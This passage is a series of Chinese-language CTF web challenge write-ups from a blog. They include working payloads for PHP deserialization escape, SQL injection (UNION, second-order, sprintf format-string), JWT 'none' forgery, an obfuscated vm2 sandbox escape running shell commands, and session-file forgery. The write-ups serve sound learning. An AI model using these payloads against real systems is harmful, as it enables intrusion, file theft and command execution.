str_replace(&#39;\\0\\0\\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data); } 这个写函数，当反序列化存储的私有成员是，会有chr(0)的出现，所以会对chr(0) . &#39;*&#39; . chr(0)进行一个替换，当读取的时候会对\\0\\0\\0进行一个还原。 看似没有什么问题，但是当我们可以的存储\\0\\0\\0进行wirte()时不会发生改变。但是进行read()时，会变为chr(0) . &#39;*&#39; . chr(0)由六字符变为三字符，可以实现字符逃逸。。。 我们可以明显看到在 read 函数处理后，原先字符中的 \\0\\0\\0被替换成 chr(0).&#39;*&#39;.chr(0)，但是字符长度标识不变 。所以在进行反序列化的时候，还会继续向后读取，这样序列化的结果就完全不一样了。 所以来看一下如何构造pop链。 class A{ public $username; public $password; function __construct($a, $b){ $this-&gt;username = $a; $this-&gt;password = $b; } } class B{ public $b = &#39;gqy&#39;; function __destruct(){ $c = &#39;a&#39;.$this-&gt;b; echo $c; } } class C{ public $c; function __toString(){ //flag.php echo file_get_contents($this-&gt;c); return &#39;nice&#39;; } } class C存在file_get_contents()函数，可以读取文件内容，可以让$c为flag.php,并且存在__toString()魔术方法。。 class B函数存在echo 那么大致思路就出来了 &lt;?php class A{ public $username; public $password; function __construct($a, $b){ $this-&gt;username = $a; $this-&gt;password = $b; } } class B{ public $b; function __destruct(){ $c = &#39;a&#39;.$this-&gt;b; echo $c; } } class C{ public $c = &#39;flag.php&#39;; function __toString(){ //flag.php echo file_get_contents($this-&gt;c); return &#39;nice&#39;; } } $aaa = new A(); $bbb = new B(); $ccc = new C(); $bbb-&gt;b=$ccc; // echo serialize($bbb); $aaa-&gt;password=$bbb; echo serialize($aaa); 得到O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;N;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}} 因为要造成反序列化逃逸：所以password值为：&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}} 带入反序列化的解果为：O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:3:&quot;aaa&quot;;s:8:&quot;password&quot;;s:72:&quot;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&quot;;} 所以我们要逃逸的字符为:&quot;;s:8:&quot;password&quot;;s:72:&quot;一共23个字符，但是\\0\\0\\0替换为chr(0) . &#39;*&#39; . chr(0)一次逃逸3个字符，所以要是三的倍数。。所以password为A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}username为24个\\0; payload: a=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b=A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}} web2打开页面是一个登陆框： 尝试一下发现存在waf,于是看一下都过滤了写什么函数。。 发现过滤的挺多的，也挺全的，一时没有了解头绪 看一下源代码，发现了收获，2333 这个%s让我想到了格式化字符串的漏洞。。上网找到这样的一篇文章参考文章发现骚姿势，SQL注入可以和格式化字符串一起使用 例如： &lt;?php $input1 = &#39;%1$c) OR 1 = 1 /*&#39;; $input2 = 39; $sql = &quot;SELECT * FROM foo WHERE bar IN (&#39;$input1&#39;) AND baz = %s&quot;; $sql = sprintf($sql, $input2); echo $sql; 输出为select * from foo where bar in(&#39;&#39;) or 1=1 /*&#39;) and baz=39 %c起到了类似chr()的效果，将数字39转化为&#39;，从而导致了sql注入。 我们尝试一下利用这种方法 得到了账户密码 发现是admin用户的密码猜测存在后台，找到了后台的位置/admin然后进行登陆，发现，这是一个套娃题 。。 淦 这里面对发现了眼熟的代码： 是一个经典的配置文件写入问题漏洞.参考链接payload: a\\&#39;;phpinfo();// 然后再shell.php看到了phpinfo()的界面。。 我以为就可以得到flag了。。谁知道有disable_functions set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail 想到了题目给了一个so文件。。猜测是上传so文件来进行提权操作。。。但是尝试了半天无果。。这应该是最后一步了，并且好多人在搅屎 最后两分钟有大佬拿到了一血tql。 MISCblueshark打开题目，发现这是一个蓝牙协议： 发现存在一个7z的压缩包。提示压缩包密码为PIN码 一个骚操作将pcap文件后缀改为zip可以得到这个压缩包。。。然后找到了PIN码的流量，得到PIN码 打开压缩包，得到flag 6G还远吗？刚开始发现是下载的779MB的文件，就点击下载了，然后去看别的题目了，但是过一会发现这个下载速度不对呀。。意识到事情有一丝丝的不对。。嘿嘿 暂停下载找到下载的临时文件打开得到了flag 总结这次月赛，学到了一些新知识，以及骚操作 大佬们都tql。。。 参考链接https://www.cnblogs.com/test404/p/7821884.htmlhttps://www.cnblogs.com/wh4am1/p/6607837.htmlhttps://xz.aliyun.com/t/6588","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"2020 虎符网络安全竞赛 web Writeup","slug":"2020-虎符网络安全竞赛-web-Writeup","date":"2020-04-19T15:50:15.000Z","updated":"2020-04-19T18:13:48.071Z","comments":true,"path":"2020/04/19/2020-虎符网络安全竞赛-web-Writeup/","link":"","permalink":"http://yoursite.com/2020/04/19/2020-虎符网络安全竞赛-web-Writeup/","excerpt":"","text":"前言这周有虎符的安全竞赛，真神仙打架。大佬们都tql。。一共出了三个web题目，在这里总结一下。。 easy_login打开是一个登陆框的界面，通过题目的描述知道是一个nodejs写的网站。 查看/static/js/app.js源代码发现： 看注释静态映射到了根目录，猜测可以读取源码，访问app.js,controller.js 可以看到源码 app.js const Koa = require(&#39;koa&#39;); const bodyParser = require(&#39;koa-bodyparser&#39;); const session = require(&#39;koa-session&#39;); const static = require(&#39;koa-static&#39;); const views = require(&#39;koa-views&#39;); const crypto = require(&#39;crypto&#39;); const { resolve } = require(&#39;path&#39;); const rest = require(&#39;./rest&#39;); const controller = require(&#39;./controller&#39;); const PORT = 80; const app = new Koa(); app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)]; global.secrets = []; app.use(static(resolve(__dirname, &#39;.&#39;))); app.use(views(resolve(__dirname, &#39;./views&#39;), { extension: &#39;pug&#39; })); app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app)); // parse request body: app.use(bodyParser()); // prepare restful service app.use(rest.restify()); // add controllers: app.use(controller()); app.listen(PORT); console.log(`app started at port ${PORT}...`); 然后测试出还有/controllers/api.js const crypto = require(&#39;crypto&#39;); const fs = require(&#39;fs&#39;) const jwt = require(&#39;jsonwebtoken&#39;) const APIError = require(&#39;../rest&#39;).APIError; module.exports = { &#39;POST /api/register&#39;: async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || username === &#39;admin&#39;){ throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;); } if(global.secrets.length &gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString(&#39;hex&#39;); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;}); ctx.rest({ token: token }); await next(); }, &#39;POST /api/login&#39;: async (ctx, next) =&gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) { throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;}); const status = username === user.username &amp;&amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, &#39;GET /api/flag&#39;: async (ctx, next) =&gt; { if(ctx.session.username !== &#39;admin&#39;){ throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;); } const flag = fs.readFileSync(&#39;/flag&#39;).toString(); ctx.rest({ flag }); await next(); }, &#39;GET /api/logout&#39;: async (ctx, next) =&gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); } }; 代码审计一下，发现是jwt加密验证。 一些jwt库支持none算法，将算法修改为none，即没有签名算法。当alg字段被修改为none时，后端若是支持none算法，后端不会进行签名验证。 做法：将header中的alg字段可被修改为none，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’） 然后直接提交到服务端去即可。。 只要想办法令secret为undefined就可以使用none签名校验了。。 js的一些特性： 可以让secectid为0.1来进行绕过。 先注册一个账号，抓取一下jwt进行解密。。jwt解密链接网站上的不能将alg设置为none，用脚本进行加密： #encoding=utf-8 import base64 def b64urlencode(data): return base64.b64encode(data).replace(&#39;+&#39;, &#39;-&#39;).replace(&#39;/&#39;, &#39;_&#39;).replace(&#39;=&#39;, &#39;&#39;) print b64urlencode(&quot;{\\&quot;typ\\&quot;:\\&quot;JWT\\&quot;,\\&quot;alg\\&quot;:\\&quot;none\\&quot;}&quot;) + \\ &#39;.&#39; + b64urlencode(&quot;{\\&quot;secretid\\&quot;:\\&quot;0.1\\&quot;,\\&quot;username\\&quot;:\\&quot;admin\\&quot;,\\&quot;password\\&quot;:\\&quot;123456\\&quot;}&quot;) + &#39;.&#39; 脚本生成jwt加密字符串eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IjAuMDEiLCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYifQ. 然后尝试admin登陆，进行抓包： 发现登陆成功，放包发现成功使用admin登陆了，然后点击getflag发现没有反应。。然后再次抓包得到flag.. just_escape打开页面发现：访问run.php得到源码： &lt;?php if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#39;code&#39; ] != NULL ) { $code = $_GET[&#39;code&#39;]; echo eval(code); } else { highlight_file(__FILE__); } ?&gt; 天真的我，以为是php命令执行绕过。。。 尝试了一下phpinfo()发现： 再看了看提示，发现不是php。 仔细看了下代码 eval里的code这个细节猜测应该是js写的，php是假象 验证后发现，code执行的确实是js的代码。。。 科学上网发现了这么一篇文章：https://www.anquanke.com/post/id/170708?display=mobile 访问/run.php?code=Error().stack得到: Error at vm.js:1:1 at ContextifyScript.Script.runInContext (vm.js:59:29) at VM.run (/usr/src/app/node_modules/vm2/lib/main.js:219:62) at /usr/src/app/server.js:51:33 at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5) at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5) at /usr/src/app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/usr/src/app/node_modules/express/lib/router/index.js:335:12) 发现题目设置的模块vm.js，然后发现对应的vm2仓库里已经有很多 escape 的 issue 了找到了这个 https://github.com/patriksimek/vm2/issues/225 直接输入代码： 发现返回了一个键盘的页面。。 测试发现过滤了一些关键字：单引号、双引号、exec、prototype等等，会被拦截，然后返回这个键盘页面。。。 测试发现可以通过十六进制编码来进行关键字绕过： (function(){TypeError[`\\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65`][`\\x67\\x65\\x74\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`] = f=&gt;f[`\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72`](`\\x72\\x65\\x74\\x75\\x72\\x6e\\x20\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`)();try{Object.preventExtensions(Buffer.from(``)).a = 1;}catch(e){return e[`\\x67\\x65\\x74\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`](()=&gt;{}).mainModule.require((`\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`))[`\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63`](`whoami`).toString();}})() 修改要执行的命令，就能得到flag了 payload: (function(){TypeError[`\\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65`][`\\x67\\x65\\x74\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`] = f=&gt;f[`\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72`](`\\x72\\x65\\x74\\x75\\x72\\x6e\\x20\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`)();try{Object.preventExtensions(Buffer.from(``)).a = 1;}catch(e){return e[`\\x67\\x65\\x74\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`](()=&gt;{}).mainModule.require((`\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73`))[`\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63`](`cat%20/flag`).toString();}})() babyupload打开页面，发现给出了源码： &lt;?php error_reporting(0); session_save_path(&quot;/var/babyctf/&quot;); session_start(); require_once &quot;/flag&quot;; highlight_file(__FILE__); if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;) { $filename=&#39;/var/babyctf/success.txt&#39;; if(file_exists($filename)){ safe_delete($filename); die($flag); } } else{ $_SESSION[&#39;username&#39;] =&#39;guest&#39;; } $direction = filter_input(INPUT_POST, &#39;direction&#39;); $attr = filter_input(INPUT_POST, &#39;attr&#39;); $dir_path = &quot;/var/babyctf/&quot;.$attr; if($attr===&quot;private&quot;){ $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;]; } if($direction === &quot;upload&quot;){ try{ if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){ throw new RuntimeException(&#39;invalid upload&#39;); } $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;]; $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]); if(preg_match(&#39;/(\\.\\.\\/|\\.\\.\\\\\\\\)/&#39;, $file_path)){ throw new RuntimeException(&#39;invalid file path&#39;); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){ $upload_result = &quot;uploaded&quot;; }else{ throw new RuntimeException(&#39;error while saving&#39;); } } catch (RuntimeException $e) { $upload_result = $e-&gt;getMessage(); } } elseif ($direction === &quot;download&quot;) { try{ $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;)); $file_path = $dir_path.&quot;/&quot;.$filename; if(preg_match(&#39;/(\\.\\.\\/|\\.\\.\\\\\\\\)/&#39;, $file_path)){ throw new RuntimeException(&#39;invalid file path&#39;); } if(!file_exists($file_path)) { throw new RuntimeException(&#39;file not exist&#39;); } header(&#39;Content-Type: application/force-download&#39;); header(&#39;Content-Length: &#39;.filesize($file_path)); header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;); if(readfile($file_path)){ $download_result = &quot;downloaded&quot;; }else{ throw new RuntimeException(&#39;error while saving&#39;); } } catch (RuntimeException $e) { $download_result = $e-&gt;getMessage(); } exit; } ?&gt; 读代码，发现这是一个存在上传和下载文件的功能。获取flag的条件：1.$_SESSION[&#39;username&#39;] ===&#39;admin&#39;) 存在/var/babyctf/success.txt 我们一步一步来：使$_SESSION[&#39;username&#39;] ===&#39;admin&#39;)，我们发现没有什么代码和修改这个变量值的，但是在代码开头设置了保存session文件的路径： session_save_path(&quot;/var/babyctf/&quot;); session_start(); 通过session文件的命名规则，可以推断session文件为：/var/babyctf/sess_XXXXX(为PHPSESSID的值)。。 我们尝试读取一下，session文件：post： direction=download&amp;filename=sess_a41c14e052970b6a0af81246c69b552d 内容为： &lt;0x08&gt;usernames:5:&quot;guest&quot;; 猜测我们只要上传一个session文件内容为： &lt;0x08&gt;usernames:5:&quot;admin&quot;; 并且命名为：sess_XXXXXXXXXX，然后设置PHPSESSID就可以使得$_SESSION[&#39;username&#39;] ===&#39;admin&#39;)成立了。 分析上传代码发现： 发现如果不上传attr参数，dir_path会直接拼接上传的文件名+&quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]); 如果把上传文件名设置为sess，并且不传递attr参数，就可以得到/var/babyctf/sess_XXXXXXXXX，这就可以当成session文件。。 hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])，虽然tmp_name是不可控的随机值，但是hash_file()是根据文件内容得到的hash值。就是说文件内容可控，那么文件名就是可控的了。 在本地创建一个文件名为sess: 在本地写一个上传页面： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;http://6fd7b64f65904b0292d5a9065cd7735c12715e9b616c4eec.changame.ichunqiu.com/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;attr&quot; /&gt; &lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;direction&quot; /&gt; &lt;br&gt; &lt;input type=&quot;file&quot; name=&quot;up_file&quot; /&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; /&gt; &lt;/body&gt; &lt;/html&gt; 抓包上传文件： 获取文件的hash_file值 &lt;?php echo hash_file(&quot;sha256&quot;,&quot;./sess&quot;); ?&gt; 输出： 432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4 尝试读一下sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4看是否写成功： 然后就差success.txt了。可以把attr参数设置为success.txt。可以将success.txt变成一个目录。从而绕过了限制。 然后将PHPSESSID修改为432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4,就可以得到flag。 总结这次的web题目，学到了一些东西，做题最重要的还是细心。多查阅文档，不能轻易的放弃，要有耐心。。。。 这次比赛师傅们都tql了，神仙打架","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"phpMyAdmin的渗透思路","slug":"phpMyAdmin的渗透思路","date":"2020-04-15T08:10:27.000Z","updated":"2020-04-22T02:18:04.043Z","comments":true,"path":"2020/04/15/phpMyAdmin的渗透思路/","link":"","permalink":"http://yoursite.com/2020/04/15/phpMyAdmin的渗透思路/","excerpt":"","text":"前言phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。 在一些网站的目录下有可能会存在phpMyAdmin的目录。","categories":[],"tags":[{"name":"web技巧","slug":"web技巧","permalink":"http://yoursite.com/tags/web技巧/"}]},{"title":"历届网鼎真题复盘","slug":"历届网鼎真题复盘","date":"2020-04-07T06:09:31.000Z","updated":"2020-04-15T08:03:02.310Z","comments":true,"path":"2020/04/07/历届网鼎真题复盘/","link":"","permalink":"http://yoursite.com/2020/04/07/历届网鼎真题复盘/","excerpt":"","text":"网鼎杯-2018-Unfinish打开页面发现直接事登陆页面： 尝试寻找，找到了注册页面register.php。。注册账号登陆发现：登陆后，页面没有什么功能，只显示用户名所以猜测是二次注入。 尝试注册用户0&#39;^123^&#39;0登陆发现：用户名显示为123，所以大致的思路已经清晰了，可以一位一位的爆数据，但是在注册页面发现用户名过滤了,所有可以这样爆数据：0&#39;^(select ascii(substr(database() from 1 for 1 )))^&#39;0类似这样可以爆出数据库的所有内容 脚本如下： import requests import string import re as r import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) ch = string.ascii_lowercase+string.digits+&#39;-}&#39;+&#39;{&#39; re = requests.session() url = &#39;http://6b1599a2-65b3-4c80-a75d-5200bc1a966c.node3.buuoj.cn/&#39; def register(email,username): url1 = url+&#39;register.php&#39; data = dict(email = email, username = username,password = &#39;adsl1234&#39;) html = re.post(url1,data=data) html.encoding = &#39;utf-8&#39; return html def login(email): url2 = url+&#39;login.php&#39; data = dict(email = email,password = &#39;adsl1234&#39;) html = re.post(url2, data=data) html.encoding = &#39;utf-8&#39; return html f = &#39;&#39; for j in range(1,50): payload = &quot;0&#39;^(select ascii(substr((select * from flag) from {} for {})))^&#39;0&quot;.format(int(j),1) email = &#39;{}@qq.com&#39;.format(str(j)+&#39;aaa&#39;) html = register(email,payload) html = login(email) try: res = r.findall(r&#39;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#39;,html.text,r.S) flag = res[0][1:].strip() f += chr(int(flag)) print f except: print &quot;error&quot; 得到flag: 网鼎杯-2018-Fakebook打开页面，注册账号进行登陆，这个页面传递的参数为：view.php?no=1猜测存在sql注入。测试了一下：发现过滤union select 但是union/**/select可以绕过,尝试一下联合注入。。 测试发现：一共有4列，回显为在第二列。 库名：fakebook payload: /view.php?no=0%20union/**/select+1,database(),3,4 表名： users payload: /view.php?no=0%20union/**/select+1,(SELECT%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),3,4 列名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONSpayload: /view.php?no=0%20union/**/select+1,(Select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),3,4 但是没有发现flag。。。。 猜测flag是在页面flag.php里面，尝试读取flag页面内容：/view.php?no=0%20union/**/select+1,load_file(%27/var/www/html/flag.php%27),3,4得到flag: 网鼎杯-2018-Comment打开页面，发帖需要登陆，根据登陆框的提示，爆破得到账号密码zhangwei:zhangwei666 扫了一下目录，发现存在.git,猜测存在源码泄露： 存在write_do.php的源码： &lt;?php include &quot;mysql.php&quot;; session_start(); if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){ header(&quot;Location: ./login.php&quot;); die(); } if(isset($_GET[&#39;do&#39;])){ switch ($_GET[&#39;do&#39;]) { case &#39;write&#39;: $category = addslashes($_POST[&#39;category&#39;]); $title = addslashes($_POST[&#39;title&#39;]); $content = addslashes($_POST[&#39;content&#39;]); $sql = &quot;insert into board set category = &#39;$category&#39;, title = &#39;$title&#39;, content = &#39;$content&#39;&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break; case &#39;comment&#39;: $bo_id = addslashes($_POST[&#39;bo_id&#39;]); $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)[&#39;category&#39;]; $content = addslashes($_POST[&#39;content&#39;]); $sql = &quot;insert into comment set category = &#39;$category&#39;, content = &#39;$content&#39;, bo_id = &#39;$bo_id&#39;&quot;; $result = mysql_query($sql); } header(&quot;Location: ./comment.php?id=$bo_id&quot;); break; default: header(&quot;Location: ./index.php&quot;); } } else{ header(&quot;Location: ./index.php&quot;); } ?&gt; 分析代码 存在二次注入：先addslashes转义存入数据库。再从数据库中查询放入sql语句。没有进行转义 sql语句为： $sql = &quot;insert into comment set category = &#39;$category&#39;, content = &#39;$content&#39;, bo_id = &#39;$bo_id&#39;&quot;; $result = mysql_query($sql); 我们可以通过注释符来进行操作： $sql = &quot;insert into comment set category = &#39;&#39;,content=database(),/*&#39;, content = &#39;*/#&#39;, bo_id = &#39;$bo_id&#39;&quot;; 所以 我们发贴为CATEGORY：123&#39;,content=database(),/*然后评论为*/#就能够进行二次注入了。 所以，我们以可尝试读文件：读取下www用户的.bash_history payload: 123&#39;,content=(select( load_file(&#39;/home/www/.bash_history&#39;))),/* 我们发现/tmp/html/.DS_Store文件还在 读一下 payload：123&#39;, content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/* 得到flag文件名： payload：123&#39;,content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*得到：3C3F7068700A0924666C61673D22666C61677B39626661663262342D386362382D343435662D616134662D3631643231313531656130657D223B0A3F3E0A得到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"XCTF 高校战“疫”网络安全分享赛部分web writeup","slug":"XCTF-高校战“疫”网络安全分享赛部分web-writeup","date":"2020-03-09T01:42:28.000Z","updated":"2020-03-21T01:34:56.218Z","comments":true,"path":"2020/03/09/XCTF-高校战“疫”网络安全分享赛部分web-writeup/","link":"","permalink":"http://yoursite.com/2020/03/09/XCTF-高校战“疫”网络安全分享赛部分web-writeup/","excerpt":"","text":"前言这周XCTF举办了 高校战“疫”网络安全分享赛，题目很骚，学到了点知识，在此记录一下。 websqlcheckin打开发现存在源码： &lt;?php // ... $pdo = new PDO(&#39;mysql:host=localhost;dbname=sqlsql;charset=utf8;&#39;, &#39;xxx&#39;, &#39;xxx&#39;); $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); $stmt = $pdo-&gt;prepare(&quot;SELECT username from users where username=&#39;${_POST[&#39;username&#39;]}&#39; and password=&#39;${_POST[&#39;password&#39;]}&#39;&quot;); $stmt-&gt;execute(); $result = $stmt-&gt;fetchAll(); if (count($result) &gt; 0) { if ($result[0][&#39;username&#39;] == &#39;admin&#39;) { include(&#39;flag.php&#39;); exit(); // .... 发现是PDO，以前做的PDO都是宽字节注入，这个没宽字节，一直没有思路。 后来把关键处代码丢进百度，直接搜到了原题…..参考文档直接用上面的payload: username:admin password:&#39;-0-&#39; 登陆即可得到flag。。。 hackme扫目录发现源码泄露www.zip。对源码进行审计： 在init.php中，发现其中设置了反序列化处理器为php_serialize &lt;?php //初始化整个页面 error_reporting(0); //lib.php包括一些常见的函数 include &#39;lib.php&#39;; session_save_path(&#39;session&#39;); ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;); session_start(); 但是在profile.php和core/init.php中使用的反序列化处理器为`php &lt;?php error_reporting(0); session_save_path(&#39;session&#39;); include &#39;lib.php&#39;; ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); session_start(); 那么就很明显了。应该是利用session反序列化。 发现upload_sign.php存在我们可以控制的变量sign。 &lt;?php require_once(&#39;init.php&#39;); class upload_sign { public $sign; public $admin = 0; public function __construct() { if (isset($_POST[&#39;sign&#39;])) { $this-&gt;sign = $_POST[&#39;sign&#39;]; } else { $this-&gt;sign = &quot;这里空空如也哦&quot;; } } public function upload() { if ($this-&gt;checksign($this-&gt;sign)) { $_SESSION[&#39;sign&#39;] = $this-&gt;sign; $_SESSION[&#39;admin&#39;] = $this-&gt;admin; } else { echo &quot;???&quot;; } } public function checksign($sign) { return true; } } $a = new upload_sign(); $a-&gt;upload(); 可以通过这里将admin的设置为1，从而得到admin的身份。 本地反序列化： &lt;?php class info { public $admin=1; public $sign=&#39;123&#39;; } $a = new info(); echo serialize($a); ?&gt; 得到 O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:3:&quot;123&quot;;} 在登陆之后再修改信息的地方输入 123|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:3:&quot;123&quot;;} 然后访问/core/index.php，得到部分源码： &lt;?php require_once(&#39;./init.php&#39;); error_reporting(0); if (check_session($_SESSION)) { #hint : core/clear.php $sandbox = &#39;./sandbox/&#39; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]); echo $sandbox; @mkdir($sandbox); @chdir($sandbox); if (isset($_POST[&#39;url&#39;])) { $url = $_POST[&#39;url&#39;]; if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&#39;/(data:\\/\\/)|(&amp;)|(\\|)|(\\.\\/)/i&#39;, $url)) { echo &quot;you are hacker&quot;; } else { $res = parse_url($url); if (preg_match(&#39;/127\\.0\\.0\\.1$/&#39;, $res[&#39;host&#39;])) { $code = file_get_contents($url); if (strlen($code) &lt;= 4) { @exec($code); } else { echo &quot;try again&quot;; } } } } else { echo &quot;invalid url&quot;; } } else { highlight_file(__FILE__); } } else { die(&#39;只有管理员才能看到我哟&#39;); } 可以将限制分为两个部分：对URL的限制：过滤了data://,还要求是127.0.0.1一个大师傅告诉我可以这样过(膜师傅)： compress.zlib://data:@127.0.0.1/plain;base64,XXX 然后就是四个字符的命令执行了，和hitcon那个差不多。可以用人家的脚本：这个师傅讲的很全面可以参考一下。参考文章就可以得到flag了。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"v&n公开赛部分web 